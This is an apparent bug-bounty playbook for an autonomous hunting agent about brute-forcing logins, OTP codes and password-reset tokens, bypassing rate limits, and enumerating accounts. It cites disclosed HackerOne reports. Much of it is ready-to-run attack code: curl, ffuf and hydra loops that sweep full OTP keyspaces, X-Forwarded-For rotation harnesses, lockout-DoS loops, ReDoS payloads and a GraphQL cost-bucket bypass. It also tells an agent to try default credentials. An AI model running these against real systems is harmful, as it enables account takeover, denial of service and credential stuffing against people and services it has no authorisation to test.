# ffuf OTP brute (PoC probe) — -mc all + -ac so you SEE 429/403/CAPTCHA, never filter them
ffuf -u "https://$TARGET/api/verify-otp" -X POST \
  -H "Content-Type: application/json" -H "Cookie: session=SESSION" \
  -d '{"otp":"FUZZ"}' -w <(seq -f "%06g" 0 100) -mc all -ac -rate 50
# hydra login spray
hydra -l admin@target.com -P ~/wordlists/top-1000.txt "$TARGET" \
  http-post-form "/api/login:email=^USER^&password=^PASS^:Invalid" -t 4
# nuclei rate-limit / default-login templates
nuclei -u "https://$TARGET" -t http/fuzzing/ -t http/default-logins/ -severity medium,high,critical
```

---

## Payload & Detection Patterns

### Login brute (form-encoded and JSON)

```bash
# JSON API login (#819930, #1065186)
for p in $(cat passlist.txt); do
  curl -s -X POST "https://app.target.com/web-client/api/user/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"TARGET@exmple.com\",\"password\":\"$p\"}" \
    -w " $p %{http_code} %{size_download}\n" -o /dev/null
done

# Form login with CSRF/cookies STRIPPED (#3085889)
curl -s -X POST "https://$TARGET/login" -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=TARGET&password=wrong1" -w "%{http_code} %{size_download}\n" -o /dev/null

# WordPress XML-RPC brute-force amplification (#125624): many creds in ONE request
curl -i -s -k -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary @ multicall.xml "https://newsroom.uber.com/xmlrpc.php"
```

### OTP / 2FA brute

```bash
# 6-digit sweep against pending session (#979820: valid=200, invalid=400)
for c in $(seq -f "%06g" 0 999999); do
  r=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/verify-2fa" \
    -H "Cookie: $SESSION" -d "code=$c")
  [ "$r" = "200" ] && { echo "HIT $c"; break; }
done
# 4-digit / 5-digit codes shrink the keyspace further (#64666 10^4, #158157 10^5)
# Body-length oracle (#1394984): correct code gave "length around 373" — sort by len.
```

### Password-reset token brute

```bash
# Reset token validation endpoint (#271533)
for t in $(seq 1 100000); do
  r=$(curl -s -X POST "https://shoppers.target.com/password" \
    -d "reset_password_token=$t&password=newpass&password_confirmation=newpass" \
    -w " %{http_code} %{size_download}")
  echo "$t $r" | grep -v "Reset password token is invalid" && break
done
# SSAN brute via ASP.NET postback (#2748003): script harvests __VIEWSTATE then POSTs
# btnOK / __EVENTTARGET ctl00$cphPage$btnForgotPassword across candidate SSANs.
```

### Enumeration payloads

```
"Username does not exist"                 vs  "Password does not match username"   (#766875)
"No user account was found for the address given."                                (#798913)
test@test.com (exists)  vs  teste@teste.com.br (does not exist)                     (#681468)
Uber invite: "Sign up now to claim your free gift from [First Name]" vs default     (#125200)
GraphQL: {"errors":[{"message":"Login attempt limit exceeded..."}]} but still bruteable (#708013)
```

### GraphQL cost-bucket bypass

```
# Exhaust bucket with high-cost query, then reset it with negative cost (#481518):
{ appInstallations(first: 10) { edges { node { ... deep nesting ... } } } }
# then:
{ appInstallations(first: -1000) { edges { node { id } } } }
# then a normal query succeeds because the pool refilled.
```

### ReDoS / resource payloads

```
input-validation regex (a+)+$      -> 'a'*N + '!'                     (catastrophic backtracking)
email regex                        -> 'a@' + 'a'*N
URL regex                          -> 'http://' + 'a'*N
long-password hashing              -> 'a' * 1,000,000                 (#840598/#952349)
WP load-scripts.php load[]=        -> array of many script names      (#690338)
```

### Grep patterns (source review, open-source targets)

```bash
grep -rE "throttle\(|BruteForceProtection|LostController|rate.?limit" --include="*.php"
# Look for annotations that are DECLARED but never enforce throttle() (#1596918)
# Look for the endpoint that actually matters missing protection (#1987062)
# Look for Memcached used as the rate-limiter backend (#2110945)
```

### Reset-link reuse / static-token detector

```bash
# Request the same reset twice and compare the links/tokens (#862681).
for i in 1 2 3; do
  curl -s -X POST "https://$TARGET/accounts/password/reset/" -d "email=your-test@email.com"
  # extract the reset link from email -> reset_links.txt
done
sort -u reset_links.txt | wc -l
# 1 unique link across 3 requests => token is static/non-rotating -> directly bruteable.
# Compare also: does the response stay literally {"status":"ok"} every time (#280389)?
```

### IP-rotation confirmation harness

```bash
# Prove the bypass by toggling rotation OFF and watching 429 return (#819930).
BASE='curl -s -o /dev/null -w "%{http_code}" -X POST "https://app.target.com/web-client/api/user/login" -H "Content-Type: application/json" -d "{\"username\":\"TARGET@exmple.com\",\"password\":\"wrong\"}"'
echo "No rotation:"; for i in $(seq 1 130); do eval $BASE; echo; done | sort | uniq -c
echo "With rotation:"; for i in $(seq 1 130); do R=$RANDOM.$RANDOM.$RANDOM.$RANDOM; eval "$BASE -H 'X-Forwarded-For: $R'"; echo; done | sort | uniq -c
# Expect: no-rotation shows a 429/403 band after ~120; with-rotation shows none.
```

### Body-length oracle sorter (code bruteforce)

```bash
# Collect (code, status, length) tuples, then sort by length to expose the outlier (#1394984).
for c in $(seq -f "%06g" 0 999); do
  read S L < <(curl -s -o /tmp/o -w "%{http_code} %{size_download}" \
    -X POST "https://$TARGET/api/verify-code" -d "code=$c")
  echo "$L $S $c"
done | sort -n | head -10
# The shortest/unique row is the correct code; confirm by using it to authenticate.
```

### Lockout-DoS and mass-creation probes

```bash
# Attacker-triggered lockout (#3160210)
for i in $(seq 1 8); do curl -s -X POST "https://$TARGET/login" \
  -d "username=$VICTIM&password=x$i" -o /dev/null; done

# Mass creation (#426547, #245527, #1206004, #1076047)
for i in $(seq 1 100); do curl -s -X POST "https://$TARGET/apps/upload_app/" \
  -d "name=app$i" -o /dev/null -w "%{http_code}\n"; done | sort | uniq -c
# All 200 with zero 429/CAPTCHA = unthrottled resource creation.
```

### Enumeration wordlist shaping

```
# Start from identifiers the app already exposes:
#  - usernames from a public directory / leaderboard             (#3160210)
#  - first+last name disclosed with a valid email                 (#5200)
#  - valid users distinguished by recovery-page response          (#681468)
# Then shape a password list to the target's policy:
#  - 5-char passwords are explicitly allowed on some targets      (#1065186)
#  - 9-char simple password sufficed in the Outpost case          (#766875)
#  - 100 most-common passwords with YOUR real one inserted as a
#    control proves the oracle works before scaling up            (#160109)
```

---

## Common Root Causes

1. **Rate-limit keyed only on username** — Lichess #3160210 confirmed the lockout was "based solely on the username, not on the IP address or session context," so any attacker can lock any known user (also a DoS finding).
2. **Per-IP throttling that trusts client-controlled headers** — XFF/X-Real-IP/CF-Connecting-IP rotation defeats it (xAI #819930, Courier #1067533, Dashlane #225897, Acronis #2627062, LinkedIn #1578121).
3. **Protection on the web path, not the API/mobile path** — Instacart's mobile `/oauth/token` bypassed the web lockout and could even log in a web-locked account (#160109); Lichess accepted the login after deleting token+cookies (#3085889).
4. **Static, non-rotating reset token** — DoD reset link stayed the same after each request (#862681); a fixed token is bruteable and reusable.
5. **Low-entropy short codes** — 4-digit (#64666), 5-digit/100K (#158157), 6-digit (#1394984, #979820, #761000); brute is tractable without exotic resources.
6. **Protection declared but not enforced** — Nextcloud `@BruteForceProtection` middleware never calls `throttle()` (#1596918), `LostController.php` token endpoint unprotected (#1987062), Memcached backend makes the limiter a no-op (#2110945), Shopify `customerAccessTokenCreate` "did not correctly throttle login attempts" (#708013).
7. **Throttle error ignored on success** — Reddit returned the "brute" error yet accepted correct credentials (#1065186); Shopify GraphQL let brute continue after the "Login attempt limit exceeded" message (#708013).
8. **Business-logic endpoints with no throttle at all** — report-button spam auto-deletes comments (#1051734), mail/SMS bombing (#862681, #1185903, #229511), mass creation (#426547, #245527, #416906).
9. **Quota / cost underflow** — negative GraphQL `first:` values refill the bucket (#481518).
10. **Weak password policy amplifies brute** — Reddit allowed 5-character passwords with no special chars (#1065186); default admin creds on fabric-ca (#411364).
11. **Missing notification on abuse** — victims/admins got no alert during the 2FA/password attack (#149598), so brute goes unnoticed.
12. **Unbounded expensive input** — 1,000,000-char password exhausts CPU/memory during hashing (#840598, #952349); unbounded `load[]` arrays (#690338).
13. **Throttle reset on IP change but no identity binding** — ~120 attempts from one IP trigger a ban, but a single new IP clears it because the counter is not tied to the account or session (#819930, #764122).
14. **Identifier normalization bugs in the limiter itself** — the rate-limit key can be mutated with trailing spaces or `\n`, so each variant is a fresh key and the counter never accumulates (#1040471).
15. **Multiple login surfaces with inconsistent policy** — web, mobile (`/oauth/token`), admin (`wp-admin`), and OIDC realm each implement their own (or no) throttle; the weakest one wins (#160109, #788420, #341074, #855304, #1954711).
16. **No standard response for abuse** — "if this email exists we sent a link" attempts to prevent enumeration but still leaks via side channels (timing, error text, name disclosure), and victims receive no alert when their account is attacked (#5200, #149598).
17. **Promo/invite codes with a finite, enumerable space** — 5 lowercase alphanumeric chars = 36^5 ≈ 60M codes, with a distinct response for a valid code, and no cap on lookups (#125200, #125707).

---

## Bypass Techniques

### Source / IP rotation
- Rotate `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `X-Client-IP`, `CF-Connecting-IP`, `True-Client-IP` every request (#1067533, #225897, #2627062).
- `X-Forwarded-For: 127.0.0.1` then cycle `127.0.0.2`–`127.0.0.6` to reset the counter (#1067533).
- Comma-joined XFF values ("1.2.3.4, 5.6.7.8"); append the real IP after a spoofed one — parsers take first vs last differently.
- Use Burp **IP Rotator** extension to change source per request (#1578121), or simply change IP after the ~120th attempt (#819930).

### Token / parameter manipulation
- Delete the CSRF `token` parameter and cookies from the login POST entirely (#3085889).
- Append a space or `\n` to the identifier/rate-limit key parameter to bypass the counter (#1040471).
- Brute arbitrary `token` / `PHPSESSID` cookie values; change password after 300+ failed attempts (#244282).
- Reuse a static reset token/link across requests (#862681).

### Alternate-path fallbacks
- Web account locked? Replay against the mobile/API endpoint (#160109), OIDC realm auth (#855304), or `user_oidc` controllers (#1954711).
- Web CAPTCHA present? Use the JSON API path or `/api/*` login that skips it.
- Re-register the same email to trigger a second confirmation link and exploit email-change ordering (#1435392).

### Logic / quota bypasses
- GraphQL negative cost `first:-1000` to refill bucket (#481518); keep brute-forcing after the "limit exceeded" message (#708013).
- Exhaust the "send email/SMS" throttle by rotating the recipient via an "alternative email" field (#1578121).

### Detection-oracle techniques
- Sort responses by body length to find the correct code (e.g. unique len 373 — #1394984), or by status (200 valid vs 400 invalid — #979820).
- Enumerate valid users first, then spray only confirmed-valid accounts with a common-password list (#766875, #160109).
- Measure token entropy with Sequencer rather than assuming weakness; short numeric codes are the easiest targets (#64666, #158157).

### Code-rotation and race windows

- **Rotation aware math** — if a code rotates every T seconds, the reachable keyspace per window is `throughput × T`. A 6-digit code rotating every 30 s at 50 req/s exposes 1,500 guesses per window; brute is viable only when the code does NOT rotate, resets are unlimited (#764122, #1331268), or the window approaches 10^6. State this bound in the report — it is the difference between Theoretical and Critical.
- **Resend-rate-limit workaround** — a "trivial workaround to the SMS resend rate limit" can turn a throttled code into a stream of fresh codes (#619578). Each resend may also reset the wrong-attempt counter.
- **Concurrent verification** — send N candidate codes in parallel rather than serially; if the limiter increments only after request completion, the in-flight set bypasses the count (watch for a non-200 among parallel replies and correlate with the code that worked).
- **Code lifetime vs request budget** — with 5-digit codes (100K, #158157) the space is small enough that a moderate sustained rate finishes inside a single validity window.

### Multi-endpoint stitching

- Enumerate valid users on endpoint A (string/status oracle, #766875, #681468), then brute passwords on endpoint B (the unthrottled API/mobile path, #160109). Neither finding alone is Critical; together they are a credential-stuffing ATO chain.
- Trigger a reset on endpoint A (#862681), then submit the static token on endpoint B (#271533) — the "send" and "check" steps are often protected differently; the check step is the one that matters (#1987062).
- Lock the web account with failed attempts (#3160210) while authenticating via the mobile path that ignores the lockout (#160109).

### When the defense is a cache or a quota

- **Cache-wipe bypass** — if the rate-limiter stores counters in Memcached and any action partly resets a cache entry, the attempts counter is erased and brute protection disappears (#2110945). Test whether a benign cache-affecting action resets the counter mid-burst.
- **Quota underflow** — GraphQL cost buckets accept negative `first:` values; drain the bucket, inject negative cost to refill it, continue (#481518).
- **Middleware that never throttles** — on open-source targets, grep for the annotation/annotation-handler mismatch: `@BruteForceProtection` present but `throttle()` never called (#1596918), or the reset endpoint missing the annotation entirely (#1987062). A declared control that does not execute is a clean finding.

### Response-manipulation edge cases

- Delete the CSRF token AND cookies so the request falls into an unauthenticated, unthrottled handler (#3085889).
- Send the same body with a different `Content-Type` (form vs JSON) to reach a different code path with a different limiter.
- Append `\n` or a trailing space to the rate-limit identifier key; each altered value is a distinct counter (#1040471).
- Use comma-joined `X-Forwarded-For` and vary which position holds the spoof — some parsers read the first value, others the last (#1067533, #225897, #2627062).

---

## Gate 0 Validation

Before writing the report, each of these must hold:

1. **What can the attacker DO right now?** — Demonstrate a real outcome: an authenticated session, a changed password, a disabled 2FA, an enumerated account list, or a confirmed DoS. "The server returned 200 for 25 requests" (#280389) is a starting observation, not the finding. Show the reachable blast radius.
2. **Is the "no rate limit" claim real?** — Confirmed against ALL FOUR states. The shadow-throttle seed test passed (the known-good value still authenticates under burst). Latency and body size were monitored, not just status.
3. **Is the full-keyspace claim justified?** — Severity rests on reachability math (throughput × code-lifetime vs 10^6 or 36^5), not on a 101-code probe. State the numbers. For a rotating code, show the per-window bound approaches the keyspace, or that the code does not rotate.
4. **Is enumeration a server-state difference?** — Reproducible across ≥20 samples, valid vs invalid user, not a server-policy artifact. A generic "if this email exists we sent a link" message is NOT enumeration. For timing, compare medians of many samples.
5. **Is the IP-bypass proven?** — Toggle rotation off and show the `429` returns; the delta IS the proof. One fast run alone is not.
6. **Is token entropy backed by measurement?** — Burp Sequencer effective-bits, `ent`, or a demonstrated counter/timestamp structure — not "looks short."
7. **Is ReDoS super-linear?** — Doubling latency growth with a benign-control comparison; linear growth is not ReDoS.
8. **Can it be reproduced in 10 minutes by a second person?** — Endpoint live, parameter present, oracle reliable, no flaky timing/luck.

**Severity anchor:**
- Effective OTP/MFA/reset-code brute with a demonstrated ATO path → **Critical** (#3085889, #766875, #3030158, #2748003).
- No login rate limit + working credential-stuffing / IP-bypass → **High** (#819930, #293359).
- Predictable / low-entropy security token (measured) → **High**.
- Attacker-triggerable hard lockout (account DoS) → **Medium** (#3160210).
- Username/email enumeration alone → **Low–Medium** (#5200, #681468).
- ReDoS with reproducible meaningful server lag → **Medium–High** (#840598, #690338).
- Mail/SMS/mass-creation abuse → **Low–Medium**, higher when tied to a paid/limited resource (#862681, #1051734).

**Never-submit list:** blind "no 429" with no oracle; 101-code probe presented as full ATO; generic "we sent a link if the account exists" called enumeration; a theoretical DoS with no measured resource impact.

### Quick severity worksheet

Fill this in before assigning a rating — it forces the impact to be concrete rather than inferred from a status code:

```
1. Endpoint reached:          __________________________  (web / API / mobile / admin)
2. Secret being guessed:      __________________________  (OTP / reset token / password / promo)
3. Keyspace:                  __________________________  (10^4 / 10^5 / 10^6 / 36^5)
4. Observed throughput:       __________________________  (req/s, sustained)
5. Code lifetime / rotation:  __________________________  (static / T seconds)
6. Reachability bound:        __________________________  (throughput x lifetime vs keyspace)
7. Success oracle:            __________________________  (status / string / length / timing / state)
8. Defense state:             __________________________  (lockout / IP throttle / CAPTCHA / shadow / none)
9. Bypass demonstrated:       __________________________  (header rotation / token delete / negative cost / none)
10. Concrete outcome:         __________________________  (session / changed password / 2FA disabled / DoS / email list)
```

If line 10 is blank, the finding is informational regardless of how lines 1–9 look. If line 6 shows the keyspace is not actually reachable inside the validity window, downgrade from Critical and say so explicitly — the corpus includes bounties as low as $50 for reset-token brute (#271533) precisely because reachability, not the mere presence of a token, sets severity.

---

## Real Impact Examples

### Scenario A: Email-2FA OTP brute → full account takeover (Bitwarden / Evernote / MTN pattern)
An attacker with a victim's email+password reaches the 2FA prompt, marks the numeric code field in Burp Intruder, and sweeps the keyspace. Bitwarden (#979820) returned `400` for invalid codes and `200` for the valid one; Evernote (#1394984) leaked the correct 6-digit confirmation code via a unique response length (~373) during 2FA setup, then let the attacker bind their own phone to the victim's email, permanently locking the victim out. MTN (#761000) reported ATO of "about any MTN user account" via unthrottled OTP. With ~50 req/s and a non-rotating 6-digit code, the full 10^6 space falls in hours — that is the impact, and it is Critical.

### Scenario B: Password-reset token / SSAN brute → ATO and PII disclosure (DoD / Instacart pattern)
DoD's `PassReset.aspx` accepted a password reset keyed by SSAN with no rate limit; a proof-of-concept script brute-forced SSANs and disclosed PII with potential ATO (#2748003, Critical). DoD's forgot-password flow (#1059758) yielded full account takeover the same way. Instacart's `reset_password_token` endpoint (#271533, $50) returned "Reset password token is invalid" for wrong tokens and changed the password for the right one — an unthrottled boolean oracle over a finite token space. Where the reset link is static (#862681), the token never rotates, making the brute deterministic.

### Scenario C: Per-IP limit defeated by one header (xAI/MoPub & Courier pattern)
MoPub's login endpoint (#819930, $420) banned the attacker around request ~120, "but when I changed my IP and tried logging in, I was logged into the account without any additional checks" — pure per-IP throttling. Courier (#1067533) showed a single `X-Forwarded-For: 127.0.0.1` header reset the limit, enabling login brute, mass victim notification, and OTP bypass at once. The same header trick broke throttling on Dashlane (#225897) and Acronis (#2627062). The impact is that every per-IP control on the application collapses to a single spoofable header.

### Scenario D: Username-only throttling as an account-DoS primitive (Lichess pattern)
Lichess (#3160210, Medium CVSS 6.1) keyed lockout solely on the username: submitting 5–10 failed logins with a *known* username locked the victim out, and the researcher verified that logging into their own account from a different IP with the correct password was still rate-limited. Usernames were public via the user directory/leaderboard, so any account could be disabled on demand — a clean denial-of-service finding independent of brute-force success.

### Scenario E: Enumeration → targeted credential stuffing (Palo Alto pattern)
The login API at `api.outpost.co/api/v1/login` (#766875, Critical) distinguished "Username does not exist" from "Password does not match username," and accepted 33K+ requests without blocking. The researcher first exported valid usernames, then brute-forced passwords against that confirmed-valid list using a common-password wordlist — turning a generic spray into a high-yield credential-stuffing campaign leading to account takeover.

---

## Disclosed Report Citations (30 — all IDs verified in the 191-report study pack)

1. **U.S. Dept Of Defense — Lack of rate limiting in PKI/PassReset.aspx leads to PII disclosure and potential account takeover** ([H1 #2748003](https://hackerone.com/reports/2748003)) — password-reset SSAN brute → PII/ATO, `brute-otp-reset`, 2024 · Critical.
2. **Lichess — Weak Rate Limiting Controls in the LOGIN page Expose System to Brute Force and DoS Attacks** ([H1 #3085889](https://hackerone.com/reports/3085889)) — login brute via token/cookie deletion, `brute-otp-reset`, 2025 · Critical CVSS 9.8.
3. **Lichess — Improper Authentication Throttling Allows Attacker-Controlled Account Lockouts** ([H1 #3160210](https://hackerone.com/reports/3160210)) — username-keyed lockout → account DoS, `session-attack`, 2025 · Medium CVSS 6.1.
4. **X / xAI — Ability to bruteforce mopub account's password due to lack of rate limitation protection using IP rotation techniques** ([H1 #819930](https://hackerone.com/reports/819930)) — per-IP limit bypass via IP rotation, `api-endpoint`, 2020 · $420 · Low CVSS 3.7.
5. **Palo Alto Software — weak protection against brute-forcing on login api leads to account takeover** ([H1 #766875](https://hackerone.com/reports/766875)) — enumeration + 33K-request login brute, `api-endpoint`, 2020 · Critical.
6. **Linux Foundation Decentralized Trust — Brute Force of fabric-ca server admin account** ([H1 #411364](https://hackerone.com/reports/411364)) — default config/no wrong-password limit, `admin-internal`, 2018 · High.
7. **Automattic — No Rate Limit On The report Functionality Lead To Delete Any Comment When it is enabled** ([H1 #1051734](https://hackerone.com/reports/1051734)) — business-logic report spam, `fuzzing-enumeration`, 2020 · High.
8. **Acronis — Missing rate limit for current password field (Password Change) Account Takeover** ([H1 #827484](https://hackerone.com/reports/827484)) — current-password brute → ATO, `brute-otp-reset`, 2020 · Medium.
9. **Reddit — Weak rate limit could lead to ATO due to weak password protection mechanisms** ([H1 #1065186](https://hackerone.com/reports/1065186)) — throttle error ignored on correct creds + weak policy, `mutation-polyglot`, 2020 · Low.
10. **Shopify — Bypass GraphQL rate limit by abusing negative cost queries** ([H1 #481518](https://hackerone.com/reports/481518)) — GraphQL cost-bucket underflow, `graphql`, 2019 · Low.
11. **Evernote — Email Verification Bypass by bruteforcing when setting up 2FA** ([H1 #1394984](https://hackerone.com/reports/1394984)) — 6-digit confirmation-code brute, `brute-otp-reset`, 2021 · $150 · Low.
12. **Nextcloud — Possible denial of service when entering a loooong password** ([H1 #840598](https://hackerone.com/reports/840598)) — long-password hashing DoS, `dos-resource`, 2020 · $100 · Medium CVSS 5.3.
13. **Nextcloud — Missing rate limiting on password reset functionality allows to send lot of emails** ([H1 #1691195](https://hackerone.com/reports/1691195)) — reset-mail spam via IP rotation, `api-endpoint`, 2022 · $100 · Low CVSS 3.7.
14. **Courier — Rate limit function bypass can leads to occur huge critical problem into website** ([H1 #1067533](https://hackerone.com/reports/1067533)) — `X-Forwarded-For: 127.0.0.1` bypass, `host-header`, 2020 · Medium CVSS 5.3.
15. **Stellar.org — brute force attack allowed on admin page wp-admin/** ([H1 #342977](https://hackerone.com/reports/342977)) — basic-auth admin brute, `admin-internal`, 2018 · Medium.
16. **U.S. Dept Of Defense — No Rate Limiting on password/reset endpoint leads to Denial of Service** ([H1 #862681](https://hackerone.com/reports/862681)) — static reset link + mail spam, `api-endpoint`, 2020 · Medium.
17. **Chaturbate — No rate limit in stats api token endpoint** ([H1 #412526](https://hackerone.com/reports/412526)) — stats API token brute, `api-endpoint`, 2018 · Low.
18. **Instacart — Bruteforcing password reset tokens, could lead to account takeover** ([H1 #271533](https://hackerone.com/reports/271533)) — reset-token brute with invalid-token oracle, `brute-otp-reset`, 2017 · $50 · Medium.
19. **U.S. Dept Of Defense — Full account takeover due lack of rate limiting in forgot password** ([H1 #1059758](https://hackerone.com/reports/1059758)) — forgot-password code brute → ATO, `brute-otp-reset`, 2020 · High.
20. **Infogram — No Rate limit on Password Reset Function** ([H1 #280389](https://hackerone.com/reports/280389)) — reset function request flood, `redirect-handling`, 2017 · Medium.
21. **Reddit — Missing rate limit in current password change settings leads to Account takeover** ([H1 #1170522](https://hackerone.com/reports/1170522)) — current-password brute → ATO, `brute-otp-reset`, 2021 · Medium.
22. **Instacart — Brute force login and bypass locked account restrictions via iOS app** ([H1 #160109](https://hackerone.com/reports/160109)) — mobile `/oauth/token` bypasses web lockout, `auth-bypass`, 2016 · None.
23. **Bitwarden — Rate limits too low for email 2FA** ([H1 #979820](https://hackerone.com/reports/979820)) — email-2FA code brute (400 vs 200), `brute-otp-reset`, 2020 · Medium.
24. **Omise — Brute force of a current password on a disable 2fa leads to guess password and disable 2fa** ([H1 #1465277](https://hackerone.com/reports/1465277)) — current-password brute → MFA disable, `xml-parser`, 2022 · None.
25. **FormAssembly — scripts loader DOS vulnerability** ([H1 #690338](https://hackerone.com/reports/690338)) — unbounded `load-scripts.php` arrays, `dos-resource`, 2019 · Medium.
26. **Stripo Inc — Authorization for wp-admin directory are vulnerable to brute force** ([H1 #788420](https://hackerone.com/reports/788420)) — wp-admin brute (~3000 passwords/40s), `admin-internal`, 2020 · High.
27. **Reddit — No Rate limit on change password leads to account takeover** ([H1 #1165285](https://hackerone.com/reports/1165285)) — 8890-request current-password brute, `fuzzing-enumeration`, 2021 · Low.
28. **Nord Security — Email address is not validated, No Rate Limit and RCE On Forgot Password Page** ([H1 #798913](https://hackerone.com/reports/798913)) — forgot-password no-rate-limit + enumeration, `url-fetching`, 2020 · Medium.
29. **curl — Improper Restriction of Authentication Attempts in cURL** ([H1 #3030158](https://hackerone.com/reports/3030158)) — authentication brute with no lockout, `server-side-rendering`, 2025 · Critical.
30. **Uber — The Uber Promo Customer Endpoint Does Not Implement Multifactor Authentication, Blacklisting or Rate Limiting** ([H1 #293359](https://hackerone.com/reports/293359)) — x-uber-token/bearer enumeration, `api-endpoint`, 2017 · High.

---

## Related Skills & Chains

| Finding | Chain to | Impact |
|---------|----------|--------|
| No effective rate limit on OTP (full 10^6 reachable) | MFA bypass → ATO | Critical |
| Password-reset code/token brute + IP rotation | Reset → ATO (DoD/Instacart class) | Critical |
| No login rate limit + enumeration | Targeted credential stuffing with breach corpus | High |
| IP bypass via X-Forwarded-For et al. | Every per-IP limit on the app defeated | High |
| Predictable / low-entropy reset token (measured) | Token guess within validity window → ATO | High |
| ReDoS / long-password hashing on a public field | Single-request CPU/memory exhaustion → DoS | Medium–High |
| Attacker-triggerable hard lockout | Targeted account DoS (lock victim out) | Medium |
| Unthrottled registration / creation endpoints | Spam, promo abuse, resource exhaustion | Low–Medium |

- **`hunt-captcha-bypass`** — when Phase 1 shows CAPTCHA injection, this skill handles token replay, single-use, and concurrency-window bypass specifics; brute-force skill only establishes that the challenge appeared.
- **`triage-validation`** — apply the Gate 0 false-positive discipline: every "no rate limit" claim must survive the four-state classification and the shadow-throttle seed before submission.
- **`hunt-auth-bypass`** — alternate-path findings (mobile endpoint skipping web lockout, `/oauth/token` accepting a web-locked account) blur into auth-bypass; chain when the brute primitive crosses trust boundaries.
- **`hunt-api` / `hunt-graphql`** — JSON API logins and GraphQL cost-bucket mutations (`customerAccessTokenCreate`, negative `first:`) are frequent unthrottled surfaces; these skills cover schema and cost-model abuse.
- **`hunt-dos`** — long-password hashing, `load-scripts.php` arrays, mail/SMS bombing, and mass-creation findings are resource-exhaustion bugs; co-ordinate severity with this skill to avoid double-reporting the same endpoint.
- **`security-arsenal`** — load header-rotation and wordlist tooling (Burp IP Rotator, ffuf, hydra, Burp Sequencer) before running the automation section.


---

## Merged Source Knowledge

This section consolidates **10 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (50 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-brute-force/SKILL.md`

# HUNT-BRUTE-FORCE — Rate Limiting / Brute Force / Enumeration

> Grounding note: this skill is built from published technique classes, not from a
> curated set of named HackerOne reports. `report_count` is intentionally `0` — do
> not cite an exact payout or report ID you cannot verify. Where a public case is
> well-documented (e.g. Laxman Muthiyah's Instagram password-reset OTP race/rotation
> research, 2019–2021), it is named below as a *technique reference*, not a payout claim.

## Crown Jewel Targets

OTP brute force (6-digit = 1,000,000 combinations) with no effective rate limit = Critical ATO bypass.

**Highest-value chains:**
- **OTP / 2FA brute → MFA bypass → ATO** — no effective rate limit on `/verify-otp`, full 000000–999999 keyspace reachable
- **Password-reset token brute** — short/predictable/non-expiring tokens + no rate limit → ATO (the Instagram 2019 case combined a 6-digit reset code, no rate limit per request-source, and IP rotation to make 10^6 tractable)
- **Username/email enumeration → targeted credential stuffing** — valid/invalid distinguishable by response string, status code, or timing, then sprayed with breach corpora
- **Coupon / gift-card / referral code brute** — no rate limit on code validation → financial impact
- **ReDoS** — attacker-controlled input hits a catastrophic-backtracking regex → CPU exhaustion → DoS

---

## Autonomous Testing Priority

**Work within your turn budget — prioritize signal over volume.**

You cannot brute-force millions of combinations in automated testing. Focus on two things: (1) credential spraying with the most likely candidates, and (2) detecting whether rate limiting exists at all.

**Strategy:**
1. Identify the login endpoint and the expected parameter names (username/email, password).
2. Try weak/default credentials likely for the target context — default admin credentials for the app's stack, simple passwords for test environments, credentials visible elsewhere on the app (e.g. usernames exposed in profiles, default passwords in documentation).
3. After 3-5 failed attempts, check for rate-limit signals (429 status, "too many attempts" message, CAPTCHA appearance, account lockout message). Absence of these = rate limiting is missing = vulnerability.
4. Use form-encoding for traditional login forms, JSON for REST API login endpoints.

**What to look for as success:**
- Session token or JWT in the response body or Set-Cookie header
- Redirect to authenticated dashboard
- Response body that differs from the failed-login baseline

**Username enumeration (separate finding):** Try a known-valid username vs a random one. If the error message differs ("Wrong password" vs "User not found") or response time differs → user enumeration vulnerability, even without a successful login.

---

# Timing oracle (valid users hash the password, invalid users short-circuit → measurable delta).

### Phase 3b — Unthrottled registration (mass account creation)
An unrate-limited signup endpoint is an abuse finding on its own, not just an enumeration oracle: burst `*/signup`/`*/register` (rotate email + source per request) and confirm N accounts are actually created with no 429/CAPTCHA/lockout → automated mass-account creation (spam, promo/referral abuse, resource exhaustion). Low–Medium standalone; higher when it chains to a paid/limited resource. Disclosed: reports/2915502.

# Collect reset/session/OTP tokens for YOUR OWN test account, then quantify entropy.
for i in $(seq 1 20); do
  curl -s -X POST "https://$TARGET/forgot-password" -d "email=your-test@email.com"
  # Extract token from the email/link and append to tokens.txt
  sleep 2
done

# 2) If tokens are hex/base64, decode and look for structure (timestamp, counter, PID):
while read t; do echo -n "$t -> "; echo -n "$t" | xxd -r -p 2>/dev/null | xxd | head -1; done < tokens.txt

# 3) Sequential / time-correlated test — sort and diff consecutive numeric tokens:
sort -n tokens.txt | awk 'NR>1{print $1-prev} {prev=$1}'   # constant/small delta = counter-based

# Classic evil-regex triggers (nested quantifier / overlapping alternation):
for LEN in 5 10 15 20 25 30; do
  INPUT=$(python3 -c "print('a'*$LEN + '!')")              # for (a+)+$  /  (a|a)*$ style regex
  T=$(curl -s -o /dev/null -w "%{time_total}" "https://$TARGET/search?q=$INPUT")
  echo "len=$LEN -> ${T}s"
done

## Validation — false-positive discipline

Before writing the report, each must hold:

- **OTP/login "no rate limit"**: confirmed against ALL FOUR states — not just absence of `429`.
  Shadow-throttle seed test passed (the known-good value still authenticates under burst load).
  Latency and body-size were monitored, not only status code.
- **Full-keyspace claim**: severity is justified by the *reachability math* (throughput × code-lifetime
  vs 10^6), not by a 101-code probe. State the numbers in the report.
- **Enumeration**: difference is reproducible across ≥20 samples and is a *server-state* difference
  (valid vs invalid user), not a server-policy artifact (e.g. a generic "if this email exists we sent…"
  message is NOT enumeration). For timing, compare medians of many samples, never single requests.
- **IP-rotation bypass**: proven by toggling rotation off and showing the `429` returns. The delta IS
  the proof; one fast run alone is not.
- **Token entropy**: backed by an actual measurement (Burp Sequencer effective-bits, `ent`, or a
  demonstrated counter/timestamp structure), not "looks short".
- **ReDoS**: super-linear (doubling) latency growth with a benign-control comparison; linear ≠ ReDoS.
- **Scope/impact**: did you reach a real outcome (authenticated session, leaked account list, DoS)?
  A rate-limit gap with no reachable impact is informational, not Medium.

**Severity:**
- Effective brute of OTP/MFA/reset-code → demonstrated ATO path: **Critical**
